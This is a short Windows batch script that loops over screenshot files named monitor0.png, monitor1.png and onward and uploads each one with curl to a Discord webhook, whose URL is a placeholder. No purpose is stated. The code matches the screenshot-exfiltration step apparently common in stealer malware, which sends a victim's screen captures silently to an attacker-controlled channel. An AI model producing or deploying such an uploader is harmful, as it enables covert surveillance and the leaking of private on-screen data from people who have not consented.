@echo off
set WEBHOOK_URL=https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE
set i=0

:loop
if not exist "monitor%i%.png" goto done

curl -s -X POST -F "file=@monitor%i%.png" %WEBHOOK_URL%

set /a i+=1
goto loop

:done
exit /b 0
